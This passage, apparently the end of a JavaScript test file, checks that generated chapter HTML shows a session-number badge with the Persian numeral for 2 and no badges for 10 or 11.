      expect(chapterHtml).toContain('<div class="session-number-badge">۲</div>');
      expect(chapterHtml).not.toContain('<div class="session-number-badge">۱۰</div>');
      expect(chapterHtml).not.toContain('<div class="session-number-badge">۱۱</div>');
    });
  });
});
